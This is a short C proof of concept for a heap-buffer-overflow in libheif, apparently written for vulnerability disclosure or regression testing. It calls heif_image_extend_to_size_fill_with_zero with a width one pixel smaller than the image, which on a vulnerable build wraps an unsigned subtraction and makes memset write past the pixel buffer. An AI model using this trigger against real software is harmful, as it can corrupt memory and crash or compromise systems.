/*
 * PoC for a heap-buffer-overflow in HeifPixelImage::extend_to_size_with_zero(),
 * reached through the public libheif C API.
 *
 * heif_image_extend_to_size_fill_with_zero() is documented to only grow an
 * image ("The target 'width' and 'height' must each be at least the image's
 * current size"); a smaller target must be rejected with a usage error and
 * leave the image untouched. This program creates an image and then asks to
 * "extend" it to a width one pixel smaller than its current width. A correct
 * implementation returns heif_error_Usage_error. On the vulnerable tree, the
 * shrink-by-one request slips past validation and reaches the per-row
 * right-edge fill, whose length is computed as (new_width - old_width); that
 * unsigned subtraction wraps around to a huge value and memset() writes far
 * past the end of the pixel plane.
 */

#include <stdio.h>
#include <stdint.h>

#include <libheif/heif.h>

int main(void)
{
  heif_image* image = NULL;
  heif_error err;

  const int width = 100;
  const int height = 8;

  err = heif_image_create(width, height, heif_colorspace_monochrome, heif_chroma_monochrome, &image);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_create failed: %s\n", err.message);
    return 1;
  }

  err = heif_image_add_plane(image, heif_channel_Y, width, height, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_add_plane failed: %s\n", err.message);
    heif_image_release(image);
    return 1;
  }

  /* Request a width one pixel smaller than the current size. This must be
   * rejected (heif_error_Usage_error); on the vulnerable tree it instead
   * triggers an out-of-bounds write. */
  err = heif_image_extend_to_size_fill_with_zero(image, (uint32_t) (width - 1), (uint32_t) height);
  printf("extend_to_size_fill_with_zero returned code=%d subcode=%d (%s)\n",
        err.code, err.subcode, err.message ? err.message : "");

  heif_image_release(image);
  return 0;
}
